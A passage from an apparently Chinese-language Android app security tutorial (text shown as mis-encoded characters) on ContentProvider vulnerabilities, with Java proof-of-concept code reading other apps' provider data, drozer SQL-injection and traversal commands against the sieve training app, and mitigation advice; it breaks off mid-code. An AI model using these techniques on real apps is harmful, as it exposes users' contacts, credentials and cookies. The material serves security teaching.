sortOrder)</span>ï¼Œä»ContentProviderä¸­è·å–æ•°æ®ï¼›</span><br></pre></td></tr></table></figure>
<p>ä½¿ç”¨ContentResolverå¯¹ContentProviderä¸­çš„æ•°æ®è¿›è¡Œæ“ä½œï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ContentResolver</span> <span class="variable">resolver</span> <span class="operator">=</span> getContentResolver();</span><br><span class="line"> <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(<span class="string">&quot;content://com.wang.provider.myprovider/tablename&quot;</span>);</span><br><span class="line"> <span class="comment">//æ·»åŠ ä¸€æ¡è®°å½•</span></span><br><span class="line"> <span class="type">ContentValues</span> <span class="variable">values</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContentValues</span>();</span><br><span class="line"> values.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;wang1&quot;</span>);</span><br><span class="line"> values.put(<span class="string">&quot;age&quot;</span>, <span class="number">28</span>);</span><br><span class="line"> resolver.insert(uri, values);</span><br><span class="line"> <span class="comment">//è·å–tablenameè¡¨ä¸­æ‰€æœ‰è®°å½•</span></span><br><span class="line"> <span class="type">Cursor</span> <span class="variable">cursor</span> <span class="operator">=</span> resolver.query(uri, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="string">&quot;tablename data&quot;</span>);</span><br><span class="line"><span class="keyword">while</span>(cursor.moveToNext())&#123;</span><br><span class="line">   Log.i(<span class="string">&quot;ContentTest&quot;</span>, <span class="string">&quot;tablename_id=&quot;</span>+ cursor.getInt(<span class="number">0</span>)+ <span class="string">&quot;, name=&quot;</span>+ cursor.getString(<span class="number">1</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æŠŠidä¸º2çš„è®°å½•çš„nameå­—æ®µå€¼æ›´æ”¹æ–°ä¸ºzhang1</span></span><br><span class="line"><span class="type">ContentValues</span> <span class="variable">updateValues</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContentValues</span>();</span><br><span class="line">updateValues.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;zhang1&quot;</span>);</span><br><span class="line"><span class="type">Uri</span> <span class="variable">updateIdUri</span> <span class="operator">=</span> ContentUris.withAppendedId(uri, <span class="number">2</span>);</span><br><span class="line">resolver.update(updateIdUri, updateValues, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"><span class="comment">//åˆ é™¤idä¸º2çš„è®°å½•ï¼Œå³å­—æ®µage</span></span><br><span class="line"><span class="type">Uri</span> <span class="variable">deleteIdUri</span> <span class="operator">=</span> ContentUris.withAppendedId(uri, <span class="number">2</span>);</span><br><span class="line">resolver.delete(deleteIdUri, <span class="literal">null</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure>
<h3 id="ç›‘å¬æ•°æ®å˜åŒ–">ç›‘å¬æ•°æ®å˜åŒ–</h3>
<p>å¦‚æœContentProviderçš„è®¿é—®è€…éœ€è¦çŸ¥é“æ•°æ®å‘ç”Ÿçš„å˜åŒ–ï¼Œå¯ä»¥åœ¨ContentProviderå‘ç”Ÿæ•°æ®å˜åŒ–æ—¶è°ƒç”¨getContentResolver().notifyChange(uri, null)æ¥é€šçŸ¥æ³¨å†Œåœ¨æ­¤URIä¸Šçš„è®¿é—®è€…ã€‚åªç»™å‡ºç±»ä¸­ç›‘å¬éƒ¨åˆ†çš„ä»£ç ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyProvider</span> <span class="keyword">extends</span> <span class="title class_">ContentProvider</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> Uri <span class="title function_">insert</span><span class="params">(Uri uri, ContentValues values)</span> &#123;</span><br><span class="line">     db.insert(<span class="string">&quot;tablename&quot;</span>, <span class="string">&quot;tablenameid&quot;</span>, values);</span><br><span class="line">      getContext().getContentResolver().notifyChange(uri, <span class="literal">null</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è€Œè®¿é—®è€…å¿…é¡»ä½¿ç”¨ContentObserverå¯¹æ•°æ®ï¼ˆæ•°æ®é‡‡ç”¨uriæè¿°ï¼‰è¿›è¡Œç›‘å¬ï¼Œå½“ç›‘å¬åˆ°æ•°æ®å˜åŒ–é€šçŸ¥æ—¶ï¼Œç³»ç»Ÿå°±ä¼šè°ƒç”¨ContentObserverçš„onChange()æ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">getContentResolver().registerContentObserver(Uri.parse(<span class="string">&quot;content://com.ljq.providers.personprovider/person&quot;</span>),</span><br><span class="line">        <span class="literal">true</span>, <span class="keyword">new</span> <span class="title class_">PersonObserver</span>(<span class="keyword">new</span> <span class="title class_">Handler</span>()));</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PersonObserver</span> <span class="keyword">extends</span> <span class="title class_">ContentObserver</span>&#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="title function_">PersonObserver</span><span class="params">(Handler handler)</span> &#123;</span><br><span class="line">       <span class="built_in">super</span>(handler);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onChange</span><span class="params">(<span class="type">boolean</span> selfChange)</span> &#123;</span><br><span class="line">        <span class="comment">//to do something</span></span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<h3 id="Content-Provideræ¼æ´åŸç†åˆ†æ">Content Provideræ¼æ´åŸç†åˆ†æ</h3>
<ul>
<li>ä¿¡æ¯æ³„éœ²</li>
<li>SQLæ³¨å…¥</li>
<li>ç›®å½•éå†</li>
</ul>
<p>Content Provideræ¼æ´çš„å±å®³ï¼š</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Androidä¸­Content </span>Providerèµ·åˆ°åœ¨ä¸åŒçš„è¿›ç¨‹APPä¹‹é—´å®ç°å…±äº«æ•°æ®çš„ä½œç”¨ï¼Œé€šè¿‡<span class="keyword">Binderè¿›ç¨‹é—´é€šä¿¡æœºåˆ¶ä»¥åŠåŒ¿åå…±äº«å†…å­˜æœºåˆ¶æ¥å®ç°ï¼Œä½†æ˜¯è€ƒè™‘åˆ°æ•°æ®çš„å®‰å…¨æ€§ï¼Œæˆ‘ä»¬éœ€è¦è®¾ç½®ä¸€å®šçš„ä¿æŠ¤æƒé™ã€‚</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">Binderè¿›ç¨‹é—´é€šä¿¡æœºåˆ¶çªç ´äº†ä»¥åº”ç”¨ç¨‹åºä¸ºè¾¹ç•Œçš„æƒé™æ§åˆ¶ï¼Œæ˜¯å®‰å…¨å¯æ§çš„ï¼Œæ•°æ®çš„è®¿é—®æ¥å£ç”±æ•°æ®çš„æ‰€æœ‰è€…æ¥æä¾›ï¼Œæ•°æ®æä¾›æ–¹å®ç°å®‰å…¨æ§åˆ¶ï¼Œå†³å®šæ•°æ®çš„è¯»å†™æ“ä½œ</span></span><br><span class="line"><span class="keyword"></span>è€Œcontent Providerç»„ä»¶æœ¬èº«æä¾›äº†è¯»å–æƒé™æ§åˆ¶ï¼Œè¿™å¯¼è‡´åœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­å°±ä¼šå­˜åœ¨ä¸€äº›æ¼æ´</span><br></pre></td></tr></table></figure>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">åˆ—å‡ºuri</span><br><span class="line"><span class="keyword">run</span> <span class="keyword">app</span>.provider.finduri åŒ…å</span><br><span class="line"></span><br><span class="line">è¾“å‡ºæ•°æ®å†…å®¹</span><br><span class="line">adb <span class="keyword">shell</span> content <span class="keyword">query</span> --uri + å…·ä½“uriè·¯å¾„  æˆ–è€… <span class="keyword">run</span> <span class="keyword">app</span>.provider.<span class="keyword">query</span> <span class="string">&quot;å…·ä½“uri&quot;</span></span><br></pre></td></tr></table></figure>
<h4 id="ä¿¡æ¯æ³„éœ²">ä¿¡æ¯æ³„éœ²</h4>
<p><strong>åŸç†ä»‹ç»</strong></p>
<p>content URIæ˜¯ä¸€ä¸ªæ ‡å¿—providerä¸­çš„æ•°æ®çš„URIã€‚Content URIä¸­åŒ…å«äº†æ•´ä¸ªproviderçš„ä»¥ç¬¦å·è¡¨ç¤ºçš„åå­—(å®ƒçš„authority)å’ŒæŒ‡å‘ä¸€ä¸ªè¡¨çš„åå­—(ä¸€ä¸ªè·¯å¾„)ã€‚å½“ä½ è°ƒç”¨ä¸€ä¸ªå®¢æˆ·ç«¯çš„æ–¹æ³•æ¥æ“ä½œä¸€ä¸ªproviderä¸­çš„ä¸€ä¸ªè¡¨ï¼ŒæŒ‡å‘è¡¨çš„contentURIæ˜¯å‚æ•°ä¹‹ä¸€ï¼Œå¦‚æœå¯¹ContentProviderçš„æƒé™æ²¡æœ‰åšå¥½æ§åˆ¶ï¼Œå°±æœ‰å¯èƒ½å¯¼è‡´æ¶æ„çš„ç¨‹åºé€šè¿‡è¿™ç§æ–¹å¼è¯»å–APPçš„æ•æ„Ÿæ•°æ®ã€‚</p>
<p><strong>æ¼æ´å¤ç°</strong></p>
<p>æ¡ˆä¾‹ï¼š<strong>ç››å¤§æœ‰ä½ Androidå­˜åœ¨ä¿¡æ¯æ³„éœ²æ¼æ´</strong></p>
<p><strong>ç›®æ ‡ä»£ç </strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">provider</span> <span class="attr">android:name</span>=<span class="string">&quot;.providers.YouNiProvider&quot;</span> </span></span><br><span class="line"><span class="tag">          <span class="attr">android:process</span>=<span class="string">&quot;com.snda.youni.mms&quot;</span>   <span class="attr">android:authorities</span>=<span class="string">&quot;com.snda.youni.providers.DataStructs&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>æ”»å‡»ä»£ç </strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">getyouni</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    ContentResolver contentresolver=getContentResolver();</span><br><span class="line">    String[] projection=&#123;<span class="string">&quot;* from contacts--&quot;</span>&#125;;</span><br><span class="line">    <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span>Uri.parse(<span class="string">&quot;content://com.snda.youni.providers.DataStructs/message_ex&quot;</span>);</span><br><span class="line">    Cursor cursor=contentresolver.query(uri.projection,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line">    String text=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">while</span>(cursor.moveToNext())&#123;</span><br><span class="line">        text+=cursor.getString(cursor.getColumnIndex(<span class="string">&quot;display_name&quot;</span>))+<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Log.i(<span class="string">&quot;TEST&quot;</span>,text);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>ä»£ç åˆ†æ:</strong></p>
<p>æˆ‘ä»¬å¯ä»¥åˆ†æç›®æ ‡ç¨‹åºçš„providerçš„è¿›ç¨‹åå’Œæˆæƒçš„çš„URIï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®æˆæƒçš„URIæ¥æ„å»ºä¸€ä¸ªURIï¼Œç„¶åé€šè¿‡contentresolverå»è¯»å–é‡Œé¢çš„çš„åˆ—è¡¨åä¿¡æ¯ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥è·å–APPä¸­çš„éšç§æ•°æ®ä¿¡æ¯ã€‚</p>
<p>æ¡ˆä¾‹2ï¼šsieve.apk</p>
<ul>
<li>
<p>å…ˆæ‰«æå¯è®¿é—®çš„URI<br>
<code>run scanner.provider.finduris -a &lt;åŒ…å&gt;</code><br>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/image-20240923165949228.png" alt="image-20240923165949228"></p>
</li>
<li>
<p>å¯ä»¥å¯¹æ•æ„Ÿä¿¡æ¯è¿›è¡Œè¯»å–<br>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/image-20240923170729848.png" alt="image-20240923170729848"></p>
</li>
<li>
<p>å¯ä»¥çœ‹åˆ°æœ‰è´¦å·å¯†ç ä¹‹ç±»çš„æ•°æ®</p>
</li>
</ul>
<p>æ¡ˆä¾‹3ï¼š<a target="_blank" rel="noopener" href="https://mabin004.github.io/2019/04/15/Android-Download-Provider%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">CVE-2018-9546: Download Provideræ–‡ä»¶å¤´ä¿¡æ¯æ³„éœ²</a></p>
<p><strong>æ¼æ´æè¿°</strong></p>
<p>Download Providerè¿è¡Œappè·å–ä¸‹è½½çš„httpè¯·æ±‚å¤´ï¼Œä½†ç†è®ºä¸ŠAPPåªèƒ½è®¿é—®è‡ªå·±ä¸‹è½½çš„æ–‡ä»¶çš„httpè¯·æ±‚å¤´ï¼Œä½†Download Provideræ²¡æœ‰åšå¥½æƒé™é…ç½®ï¼Œå¯¼è‡´headså¯ä»¥è¢«ä»»æ„è¯»å–ã€‚headerä¸­ä¼šä¿å­˜ä¸€äº›æ•æ„Ÿæ•°æ®ï¼Œä¾‹å¦‚cookieç­‰ã€‚</p>
<p><strong>ç›®æ ‡ä»£ç </strong></p>
<p>è¯»å–headerçš„URIä¸ºï¼š<code>content://download/mydownloads/download_id/headers</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(<span class="string">&quot;content://download/mydownloads/1493/headers&quot;</span>);</span><br><span class="line"><span class="type">Cursor</span> <span class="variable">cur</span> <span class="operator">=</span> res.query(uri, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (cur != <span class="literal">null</span> &amp;&amp; cur.getCount() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(LOG_SEPARATOR);</span><br><span class="line">        sb.append(<span class="string">&quot;HEADERS FOR DOWNLOAD ID &quot;</span>).append(id).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span> (cur.moveToNext()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">rowHeader</span> <span class="operator">=</span> cur.getString(cur.getColumnIndex(<span class="string">&quot;header&quot;</span>));</span><br><span class="line">            <span class="type">String</span> <span class="variable">rowValue</span> <span class="operator">=</span> cur.getString(cur.getColumnIndex(<span class="string">&quot;value&quot;</span>));</span><br><span class="line">            sb.append(rowHeader).append(<span class="string">&quot;: &quot;</span>).append(rowValue).append(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        log(sb.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (cur != <span class="literal">null</span>)</span><br><span class="line">        cur.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>å®‰å…¨é˜²æŠ¤</strong></p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.minSdkVersionä¸ä½äº<span class="number">9</span></span><br><span class="line"><span class="number">2</span>.ä¸å‘å¤–éƒ¨appæä¾›æ•°æ®çš„ç§æœ‰<span class="attribute">content</span> provideræ˜¾ç¤ºè®¾ç½®exported=â€falseâ€ï¼Œé¿å…ç»„ä»¶æš´éœ²(ç¼–è¯‘apiå°äº<span class="number">17</span>æ—¶æ›´åº”æ³¨æ„æ­¤ç‚¹)</span><br><span class="line"><span class="number">3</span>.å†…éƒ¨appé€šè¿‡<span class="attribute">content</span> providäº¤æ¢æ•°æ®æ—¶ï¼Œè®¾ç½®protectionLevel=â€signatureâ€éªŒè¯ç­¾å</span><br><span class="line"><span class="number">4</span>.å…¬å¼€çš„<span class="attribute">content</span> providerç¡®ä¿ä¸å­˜å‚¨æ•æ„Ÿæ•°æ®</span><br><span class="line"> </span><br><span class="line">é’ˆå¯¹æƒé™ä¿æŠ¤ç»•è¿‡é˜²å¾¡æªæ–½ï¼š</span><br><span class="line"><span class="number">1</span>.ä½¿ç”¨Context<span class="selector-class">.checkCallingPermission</span>()å’ŒContext<span class="selector-class">.enforceCallingPermission</span>()æ¥ç¡®ä¿è°ƒç”¨è€…æ‹¥æœ‰ç›¸åº”çš„æƒé™ï¼Œé˜²æ­¢ä¸²è°‹æ”»å‡»(confused deputy)ã€‚</span><br><span class="line"><span class="number">2</span>.å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‡½æ•°ï¼Œè·å–åº”ç”¨çš„permissionä¿æŠ¤çº§åˆ«æ˜¯å¦ä¸ç³»ç»Ÿä¸­å·²å®šä¹‰çš„permissionä¿æŠ¤çº§åˆ«ä¸€è‡´ã€‚å¦‚æœä¸ä¸€è‡´ï¼Œåˆ™æŠ›å‡ºå¼‚å¸¸ã€‚</span><br></pre></td></tr></table></figure>
<h4 id="SQLæ³¨å…¥æ¼æ´">SQLæ³¨å…¥æ¼æ´</h4>
<p><strong>åŸç†ä»‹ç»</strong></p>
<p>â€‹        å¯¹Content Providerè¿›è¡Œå¢åˆ æ”¹æŸ¥æ“ä½œæ—¶ï¼Œç¨‹åºæ²¡æœ‰å¯¹ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œè¿‡æ»¤ï¼Œæœªé‡‡ç”¨å‚æ•°åŒ–æŸ¥è¯¢çš„æ–¹å¼ï¼Œå¯èƒ½ä¼šå¯¼è‡´sqlæ³¨å…¥æ”»å‡»ã€‚<br>
æ‰€è°“çš„SQLæ³¨å…¥æ”»å‡»æŒ‡çš„æ˜¯æ”»å‡»è€…å¯ä»¥ç²¾å¿ƒæ„é€ selectionå‚æ•°ã€projectionå‚æ•°ä»¥åŠå…¶ä»–æœ‰æ•ˆçš„SQLè¯­å¥ç»„æˆéƒ¨åˆ†ï¼Œå®ç°åœ¨æœªæˆæƒçš„æƒ…å†µä¸‹ä»Content Providerè·å–æ›´å¤šä¿¡æ¯ã€‚åº”è¯¥é¿å…ä½¿ç”¨SQLiteDatabase.rawQuery()è¿›è¡ŒæŸ¥è¯¢ï¼Œè€Œåº”è¯¥ä½¿ç”¨ç¼–è¯‘å¥½çš„å‚æ•°åŒ–è¯­å¥ã€‚ä½¿ç”¨é¢„ç¼–è¯‘å¥½çš„è¯­å¥æ¯”å¦‚SQLiteStatementï¼Œä¸ä»…å¯ä»¥é¿å…SQLæ³¨å…¥ï¼Œè€Œä¸”æ“ä½œæ€§èƒ½ä¹Ÿå¤§å¹…æé«˜ï¼Œå› ä¸ºå…¶ä¸ç”¨æ¯æ¬¡æ‰§è¡Œéƒ½è¿›è¡Œè§£æã€‚<br>
å¦å¤–ä¸€ç§æ–¹å¼æ˜¯ä½¿ç”¨query(),insert(),update(),å’Œdelete()æ–¹æ³•ï¼Œå› ä¸ºè¿™äº›å‡½æ•°ä¹Ÿæä¾›äº†å‚æ•°åŒ–çš„è¯­å¥ã€‚é¢„ç¼–è¯‘çš„å‚æ•°åŒ–è¯­å¥ï¼Œé—®å·å¤„å¯ä»¥æ’å…¥æˆ–è€…ä½¿bindString()ç»‘å®šå€¼ã€‚ä»è€Œé¿å…SQLæ³¨å…¥æ”»å‡»ã€‚</p>
<p><strong>drozerå…³äºSQLæ³¨å…¥çš„ç›¸å…³å‘½ä»¤</strong></p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">æ£€æµ‹SQLæ³¨å…¥</span><br><span class="line"><span class="keyword">run</span> scanner.provider.injection -a åŒ…å</span><br><span class="line"></span><br><span class="line">æ£€æµ‹ç›®å½•éå†</span><br><span class="line"><span class="keyword">run</span> scanner.provider.traversal -a åŒ…å</span><br><span class="line"></span><br><span class="line">SQLæ³¨å…¥</span><br><span class="line"><span class="keyword">run</span> <span class="keyword">app</span>.provider.<span class="keyword">query</span> å…·ä½“uri + [--projection] [selection]</span><br><span class="line">ç¤ºä¾‹ï¼š <span class="keyword">run</span> <span class="keyword">app</span>.provider.<span class="keyword">query</span> content:<span class="comment">//com.mwr.example.DBContentProvider/Passwords/ </span></span><br><span class="line">--projection <span class="string">&quot;* FROM SQLITE_MASTER WHERE type=&#x27;table&#x27;;--&quot;</span></span><br></pre></td></tr></table></figure>
<p>æ¡ˆä¾‹ï¼šsieve.apk</p>
<ul>
<li>
<p>æ£€æµ‹SQLæ³¨å…¥<br>
<code>run scanner.provider.injection  </code>-<code>a &lt;åŒ…å&gt;</code><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/image-20240923184807857.png" alt="image-20240923184807857"></p>
</li>
<li>
<p>æ„é€ sql</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">run</span> <span class="keyword">app</span>.provider.<span class="keyword">query</span> content:<span class="comment">//com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;&#x27;&quot;</span></span><br><span class="line"><span class="keyword">run</span> <span class="keyword">app</span>.provider.<span class="keyword">query</span> content:<span class="comment">//com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot; * from Key;--+&quot;</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>åˆ—å‡ºæ‰€æœ‰è¡¨ä¿¡æ¯|</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">run</span> <span class="keyword">app</span>.provider.<span class="keyword">query</span> content:<span class="comment">//com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;* FROM SQLITE_MASTER WHERE type=&#x27;table&#x27;;--&quot;</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>åˆ—å‡ºè¯¥appè¡¨ä¿¡æ¯</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scanner<span class="selector-class">.provider</span><span class="selector-class">.sqltables</span> -<span class="selector-tag">a</span>  com<span class="selector-class">.mwr</span><span class="selector-class">.example</span>.sieve</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="ç›®å½•éå†æ¼æ´">ç›®å½•éå†æ¼æ´</h4>
<p><strong>åŸç†ä»‹ç»</strong></p>
<p>Android Content Providerå­˜åœ¨æ–‡ä»¶ç›®å½•éå†å®‰å…¨æ¼æ´ï¼Œè¯¥æ¼æ´æºäºå¯¹å¤–æš´éœ²Content Providerç»„ä»¶çš„åº”ç”¨ï¼Œæ²¡æœ‰å¯¹Content Providerç»„ä»¶çš„è®¿é—®è¿›è¡Œæƒé™æ§åˆ¶å’Œå¯¹è®¿é—®çš„ç›®æ ‡æ–‡ä»¶çš„Content Query Uriè¿›è¡Œæœ‰æ•ˆåˆ¤æ–­ï¼Œæ”»å‡»è€…åˆ©ç”¨è¯¥åº”ç”¨æš´éœ²çš„Content Providerçš„openFile()æ¥å£è¿›è¡Œæ–‡ä»¶ç›®å½•éå†ä»¥è¾¾åˆ°è®¿é—®ä»»æ„å¯è¯»æ–‡ä»¶çš„ç›®çš„</p>
<p><strong>æ¼æ´è§¦å‘çš„å‰ææ¡ä»¶</strong></p>
<p>å¯¹å¤–æš´éœ²çš„Content Providerç»„ä»¶å®ç°äº†openFile()æ¥å£<br>
æ²¡æœ‰å¯¹æ‰€è®¿é—®çš„ç›®æ ‡æ–‡ä»¶Uriè¿›è¡Œæœ‰æ•ˆåˆ¤æ–­ï¼Œå¦‚æ²¡æœ‰è¿‡æ»¤é™åˆ¶å¦‚ï¼Œâ€œâ€¦/â€å¯å®ç°ä»»æ„å¯è¯»æ–‡ä»¶çš„è®¿é—®çš„Content Query Uri</p>
<p><strong>æ¼æ´å¤ç°</strong></p>
<p>æ¡ˆä¾‹ï¼š<a target="_blank" rel="noopener" href="http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2013-044407">èµ¶é›†ç½‘Androidå®¢æˆ·ç«¯Content Providerç»„ä»¶ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´</a></p>
<p><strong>æ¼æ´åˆ†æ</strong></p>
<p>èµ¶é›†ç½‘å®¢æˆ·ç«¯APPçš„å®ç°ä¸­å®šä¹‰äº†ä¸€ä¸ªå¯ä»¥è®¿é—®æœ¬åœ°æ–‡ä»¶çš„Content Providerç»„ä»¶ï¼Œé»˜è®¤çš„android:exported=â€œtrueâ€,å¯¹åº”com.ganji.android.jobs.html5.LocalFileContentProviderï¼Œè¯¥Providerå®ç°äº†openFile()æ¥å£ï¼Œé€šè¿‡æ­¤æ¥å£å¯ä»¥è®¿é—®å†…éƒ¨å­˜å‚¨app_webviewç›®å½•ä¸‹çš„æ•°æ®ï¼Œç”±äºåå°æœªèƒ½å¯¹ç›®æ ‡æ–‡ä»¶åœ°å€è¿›è¡Œæœ‰æ•ˆåˆ¤æ–­ï¼Œå¯ä»¥é€šè¿‡&quot;â€¦/&quot;å®ç°ç›®å½•è·¨è¶Šï¼Œå®ç°å¯¹ä»»æ„ç§æœ‰æ•°æ®çš„è®¿é—®ï¼ˆå½“ç„¶ï¼Œä¹Ÿå¯ä»¥è®¿é—®ä»»æ„å¤–éƒ¨å­˜å‚¨æ•°æ®ï¼Œåªæ˜¯æˆ‘ä»¬æ›´å…³å¿ƒç§æœ‰æ•æ„Ÿæ•°æ®ï¼‰ã€‚</p>
<p><strong>æ”»å‡»ä»£ç </strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">GJContentProviderFileOperations</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> getContentResolver().openInputStream(Uri.parse(<span 